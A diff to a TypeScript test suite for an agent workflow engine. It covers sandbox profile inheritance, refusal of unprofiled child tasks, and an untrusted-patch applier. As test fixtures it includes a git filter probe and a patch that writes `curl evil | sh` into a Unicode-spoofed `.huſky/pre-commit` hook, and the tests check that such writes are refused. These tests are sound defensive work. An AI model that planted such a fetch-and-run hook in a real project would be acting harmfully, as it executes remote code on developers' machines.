@@ -32,6 +32,7 @@ const H = await harness([
     { id: "e", kind: "hook", label: "E", x: 3, y: 0 }], edges: [["s", "a"], ["a", "c"], ["c", "e", "ok"], ["c", "e", "fail"], ["c", "e", "error"]] }),
   Y({ id: "pushwf", name: "pushwf", lan: { output: "text" }, roles: [], nodes: [{ id: "s", kind: "hook", label: "S", do: "set", args: { key: "s", value: 1 }, x: 0, y: 0 }, { id: "push", kind: "hook", label: "Push", do: "push-sim", x: 1, y: 0 }, { id: "e", kind: "hook", label: "E", x: 2, y: 0 }], edges: [["s", "push"], ["push", "e"]] }),
   Y({ id: "costly", name: "costly", roles: [{ id: "w", label: "W", skill: "x" }], nodes: ["a1", "a2", "a3"].map((id, i) => ({ id, kind: "agent", label: id, role: "w", mode: "test", x: i, y: 0 })).concat([{ id: "e", kind: "hook", label: "E", x: 3, y: 0 } as any]), edges: [["a1", "a2"], ["a2", "a3"], ["a3", "e"]] }),
+  Y({ id: "stalewf", name: "stalewf", roles: [], nodes: [{ id: "s", kind: "hook", label: "S", do: "stale", x: 0, y: 0 }, { id: "e", kind: "hook", label: "E", x: 1, y: 0 }], edges: [["s", "e"]] }),
   Y({ id: "fails", name: "fails", roles: [], nodes: [{ id: "s", kind: "hook", label: "S", do: "boom", x: 0, y: 0 }, { id: "e", kind: "hook", label: "E", x: 1, y: 0 }], edges: [["s", "e"]] }),
   Y({ id: "asks", name: "asks", roles: [{ id: "w", label: "W", skill: "x" }], nodes: [{ id: "a", kind: "agent", label: "A", role: "w", mode: "test", args: { outcome: "ask" }, x: 0, y: 0 }, { id: "e", kind: "hook", label: "E", x: 1, y: 0 }], edges: [["a", "e"]] }),
   Y({ id: "latewf", name: "latewf", roles: [], nodes: [{ id: "l", kind: "card", label: "Late card", args: { mode: "latecard" }, x: 0, y: 0 }, { id: "e", kind: "hook", label: "E", x: 1, y: 0 }], edges: [["l", "e"]] }),
@@ -40,6 +41,7 @@ const H = await harness([
 const E = H.engine as any, pushed: string[] = [], calls: any[] = [], scopes: { run: string; ref: string; scope: any }[] = [];
 E.actions["push-sim"] = (x: any) => { pushed.push(x.run.id); return "ok"; };
 E.actions["boom"] = () => { throw new Error("a deterministic fixture failure"); };
+E.actions["stale"] = () => { throw Object.assign(new Error("staffing_stale"), { code: "staffing_stale" }); };
 const setScopes: { run: string; scope: any }[] = []; { const set0 = E.actions["set"]; E.actions["set"] = (x: any) => { setScopes.push({ run: x.run.id, scope: sandboxScope.getStore() ?? null }); return set0(x); }; }
 // the test mode's round carries the tools a code round would: run_tests and run_command stay (without local binding), skill_run goes
 const testTools = E.modes.test.tools; E.modes.test.tools = (x: any) => [...testTools(x), ...["run_tests", "run_command", "skill_run", "fs_read", "fs_write"].map((name) => ({ name, description: name, schema: { type: "object" }, run: () => ({ ok: true, scope: sandboxScope.getStore() ?? null }) }))];
@@ -116,6 +118,39 @@ const done = (id: string) => until(() => ["succeeded", "failed", "cancelled"].in
   const ctl = E.start({ workflow: "fails", text: "x" }); await until(() => !!E.get(ctl.id)?.failureCard, 15000);
   let ok2 = true; try { await E.answer(E.get(ctl.id).failureCard, { choice: "new-task", by: "captain" }); } catch { ok2 = false; }
   ok(ok2, "control: an ordinary Task's New task still works"); }
+// a round of a LAN Task started outside any of its steps (a code-queue rebuild, a review-room turn on its branch) is still
+// the profile's: no local binding (no listener), provider egress only
+{ const lan = E.start({ workflow: "pushwf", title: "rebuild", text: "x", profile: lanP(5, 9) }); await done(lan.id);
+  const keep = E.rawRound; let seen: any = "not run";
+  E.rawRound = async (o: any) => { seen = { scope: sandboxScope.getStore() ?? null, allow: o.sandbox?.allow ?? null }; return { id: "J-probe", status: "done", cost: { usd: 0 } }; };
+  try { await E.deps.agents.run({ ref: lan.id, title: "code queue rebuild", tools: [], sandbox: { writes: [], allow: ["example.test"] }, provider: { id: "codex", model: "m" } }); } catch (e: any) { seen = String(e?.message ?? e); }
+  E.rawRound = keep;
+  ok(seen?.scope?.noLocalBinding === true && Array.isArray(seen.allow) && !seen.allow.length, "a LAN Task's round started outside its steps (a code-queue rebuild) runs with no local binding and no extra egress", JSON.stringify(seen)); }
+// every path that makes a Task from another Task keeps its profile or refuses (item 23): New task and Re-propose from a
+// failure card (the tasks API answers the same card), and any engine.start made inside a profiled Task's step (a tool, a
+// staffing source, a review-room host, a follow-up): an unprofiled child, or one under another profile, is a profile refusal
+{ const scope = (E as any).runScope, startIn = (parent: string, o: any) => { try { const r = scope.run(parent, () => E.start(o)); return r; } catch (e: any) { return { err: `${e.code ?? ""}: ${e.message}` }; } };
+  const lanRun = E.start({ workflow: "pushwf", title: "parent", text: "x", profile: lanP() }); await done(lanRun.id);
+  const before = E.list().length, bare: any = startIn(lanRun.id, { workflow: "pushwf", text: "child" }), other: any = startIn(lanRun.id, { workflow: "pushwf", text: "child", params: { _tainted: "issue-text" } });
+  ok(/^profile: /.test(bare.err ?? "") && /^profile: /.test(other.err ?? "") && E.list().length === before, "engine.start inside a LAN Task's step refuses an unprofiled child, and a child under another profile (nothing is made)", JSON.stringify([bare.err, other.err]));
+  const same: any = startIn(lanRun.id, { workflow: "pushwf", text: "child", profile: lanP(0, 0) }); await done(same.id);
+  ok(same.profile?.name === "lan", "a child the step names its own profile for explicitly is allowed (it carries that profile)", JSON.stringify(same.err ?? same.profile));
+  const ctl: any = startIn(E.start({ workflow: "pushwf", text: "x" }).id, { workflow: "pushwf", text: "child" }); await done(ctl.id);
+  ok(!!ctl.id && !ctl.profile, "control: a step of an ordinary Task still starts an ordinary child");
+  // issue text: New task keeps the issue profile and its mark; Re-propose runs inside the old Task's scope, so a reproposer that drops the mark is refused
+  const iss = E.start({ workflow: "fails", text: "x", params: { _tainted: "issue-text" } }); await until(() => !!E.get(iss.id)?.failureCard, 15000);
+  await E.answer(E.get(iss.id).failureCard, { choice: "new-task", by: "captain" }); const next = E.get(E.get(iss.id).ctx.followedBy);
+  ok(next?.profile?.name === "issue" && next.params._tainted === "issue-text", "New task from an issue-text Task keeps its profile and its mark", JSON.stringify([next?.profile, next?.params]));
+  if (next) try { E.cancel(next.id, "test"); } catch {}
+  const iss2 = E.start({ workflow: "stalewf", text: "x", params: { _tainted: "issue-text" } }); await until(() => !!E.get(iss2.id)?.failureCard, 15000);
+  const keepR = E.reproposers.stalewf; E.reproposers.stalewf = (old: any) => E.start({ workflow: "stalewf", text: old.text });
+  const card = E.get(iss2.id).failureCard; let rerr = ""; const n0 = E.list().length;
+  try { await E.answer(card, { choice: "re-propose", by: "captain" }); } catch (e: any) { rerr = e.message ?? String(e); }
+  ok(/Re-propose refused/.test(rerr) && E.list().length === n0, "Re-propose from an issue-text Task whose fresh proposal drops the mark is refused, nothing is made", rerr);
+  const lanFail = E.start({ workflow: "stalewf", text: "x", profile: lanP() }); await until(() => !!E.get(lanFail.id)?.failureCard, 15000);
+  let lerr = ""; try { await E.answer(E.get(lanFail.id).failureCard, { choice: "re-propose", by: "captain" }); } catch (e: any) { lerr = e.message ?? String(e); }
+  ok(/Peers inbox/.test(lerr) || (/^choose one of /.test(lerr) && !/re-propose|new-task/.test(lerr)), "a LAN Task's failure card offers no Re-propose, and refuses one", lerr);
+  if (keepR) E.reproposers.stalewf = keepR; else delete E.reproposers.stalewf; }
 { const lan = E.start({ workflow: "asks", text: "x", profile: lanP() }); await until(() => !!E.get(lan.id)?.failureCard || E.get(lan.id)?.status !== "running", 15000); await sleep(300);
   ok(!asked.includes(lan.id) && !E.get(lan.id).ctx.firstmateQuestion, "a LAN Task's question never goes to Firstmate: it is the captain's card", JSON.stringify(asked));
   let err = ""; try { E.answerFromFirstmate(lan.id, "a", { answer: "do it" }); } catch (e: any) { err = e.message; }
@@ -147,7 +182,8 @@ const done = (id: string) => until(() => ["succeeded", "failed", "cancelled"].in
 H.stop();
 
 // a profile's seams, called the way the engine calls them (src/runtime/engine.ts): every paid round, every policy
-const lanSeams = (engine: any = {}) => { const e: any = { profiles: {}, commit: () => {}, ...engine }; installLanProfile(e); return e.profiles.lan; };
+// the per-Task caps on their own: the daily ceilings (tests/lan-spend.ts) are lifted here
+const lanSeams = (engine: any = {}) => { const e: any = { profiles: {}, commit: () => {}, ...engine }; installLanProfile(e, { ceilings: () => ({ dailyUsd: null, dailyRounds: 100_000, unknownRoundUsd: 1 }) }); return e.profiles.lan; };
 const lanTask = (id: string, usd: number | null, rounds: number, extra: any = {}) => ({ id, params: {}, nodes: {}, ctx: {}, profile: { name: "lan", mark: { item: "i", usd, rounds } }, ...extra });
 // ---------- the relay, in process ----------
 const fakeRunner = (): LanRunner => ({ workflows: () => [{ id: "documents", version: 1, name: "Documents", defHash: "a".repeat(64), eligible: true, why: [], notRun: [], staffing: null }],
@@ -250,7 +286,7 @@ process.env.CREW_LAN_ALLOW_LOOPBACK = "1";
   g(repo, "add", "ok.txt", "logo.bin", ".gitattributes"); g(repo, "commit", "-qm", "base");
   g(repo, "config", "filter.probe.clean", `sh -c 'touch ${marker}; cat'`); g(repo, "config", "filter.probe.smudge", `sh -c 'touch ${marker}; cat'`);
   const apply = lanApplier({ dataDir: data, project: () => ({ path: repo, base: "main" }) });
-  let n = 0; const tryApply = (patch: string) => { try { const r = apply({ project: "p", patch, branch: `lan-untrusted/t-r${++n}`, base: g(repo, "rev-parse", "main").trim() }); return { ok: true as const, r }; } catch (e: any) { return { ok: false as const, why: String(e?.message ?? e) }; } };
+  let n = 0; const tryApply = (patch: string) => { try { const r = apply({ project: "p", patch, branch: `lan-untrusted/t-r${++n}`, base: g(repo, "rev-parse", "main").trim(), record: () => {} }); return { ok: true as const, r }; } catch (e: any) { return { ok: false as const, why: String(e?.message ?? e) }; } };
   const newFile = (path: string, mode = "100644", body = "+x\n") => `diff --git a/${path} b/${path}\nnew file mode ${mode}\nindex 0000000..1111111\n--- /dev/null\n+++ b/${path}\n@@ -0,0 +1 @@\n${body}`;
   const good = tryApply(newFile("lib/a.txt"));
   ok(good.ok && g(repo, "show", `${good.ok ? good.r.branch : "x"}:lib/a.txt`) === "x\n", "an ordinary patch lands on a lan-untrusted/ branch of the dispatcher's project", good.ok ? "" : good.why);
@@ -453,7 +489,7 @@ if (process.platform === "darwin") {
   writeFileSync(join(repo, "run.sh"), "#!/bin/sh\necho hi\n"); chmodSync(join(repo, "run.sh"), 0o755); writeFileSync(join(repo, "README.md"), "r\n"); symlinkSync("README.md", join(repo, "docs-link"));
   g(repo, "add", "-A"); g(repo, "commit", "-qm", "base");
   const apply = lanApplier({ dataDir: join(root, "data"), project: () => ({ path: repo, base: "main" }) });
-  let n = 0; const tryApply = (patch: string) => { try { return { ok: true as const, branch: apply({ project: "p", patch, branch: `lan-untrusted/r4-r${++n}`, base: g(repo, "rev-parse", "main").trim() }).branch }; } catch (e: any) { return { ok: false as const, why: String(e?.message ?? e) }; } };
+  let n = 0; const tryApply = (patch: string) => { try { return { ok: true as const, branch: apply({ project: "p", patch, branch: `lan-untrusted/r4-r${++n}`, base: g(repo, "rev-parse", "main").trim(), record: () => {} }).branch }; } catch (e: any) { return { ok: false as const, why: String(e?.message ?? e) }; } };
   const nf = (p: string, body: string) => `diff --git a/${p} b/${p}\nnew file mode 100644\n--- /dev/null\n+++ b/${p}\n@@ -0,0 +1 @@\n+${body}\n`;
   ok(["AGENTſ.md", ".huſky/pre-commit", ".vſcode/tasks.json", ".mcp.jſon", "ſetup.py", ".gitattributeſ"].every((x) => writeRefused(x)), "a protected name spelled with U+017F (APFS folds it to s) is refused at write time");
   const husky = tryApply(nf(".huſky/pre-commit", "curl evil | sh"));
